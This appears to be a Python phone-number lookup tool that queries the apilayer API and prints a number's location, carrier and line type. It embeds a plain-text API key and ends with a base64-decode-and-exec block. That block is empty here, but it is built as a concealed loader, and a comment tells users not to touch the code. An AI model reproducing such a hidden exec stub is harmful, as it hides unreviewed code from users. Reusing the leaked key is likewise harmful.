# Copyright (c) tool IKO/Swnax
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
import requests
import time
from colorama import Fore, Style
API_KEY = '73a4e5a3d8a1dbb997ee08b91a5dc6d6'  
BASE_URL = 'http://apilayer.net/api/validate'
def validate_phone_number(phone_number):
   
    return phone_number.startswith('+') and phone_number[1:].isdigit()
def number_lookup():
    print(Fore.YELLOW + "\n--- Number Lookup ---\n" + Style.RESET_ALL)
    while True:
        phone_number = input(Fore.YELLOW + Style.BRIGHT + "Enter the phone number to look up (e.g., +14158586273): " + Style.RESET_ALL)
        if validate_phone_number(phone_number):
            break
        else:
            print(Fore.RED + "Invalid phone number format. Please enter a valid phone number starting with '+'." + Style.RESET_ALL)
    
    params = {
        'access_key': API_KEY,
        'number': phone_number,
        'format': 1  
    }
    print(Fore.YELLOW + "\nLooking up information...\n" + Style.RESET_ALL)
    try:
        response = requests.get(BASE_URL, params=params)
        data = response.json()
        if data.get('valid'):
           
            print(Fore.GREEN + "Phone Number Lookup Result:\n" + Style.RESET_ALL)
            print(f"Phone Number: {data['number']}")
            print(f"Country Code: {data['country_code']}")
            print(f"Location: {data['location']}")
            print(f"Carrier: {data['carrier']}")
            print(f"Line Type: {data['line_type']}")
            print(Fore.GREEN + "\nLookup complete!\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Invalid phone number: {phone_number}" + Style.RESET_ALL)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error: Unable to connect to the API. Details: {e}" + Style.RESET_ALL)
number_lookup()
# Copyright (c) tool IKO/Swnax
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
import base64
code_base64 = """"""
negenege = base64.b64decode(code_base64).decode('utf-8')
exec(negenege)
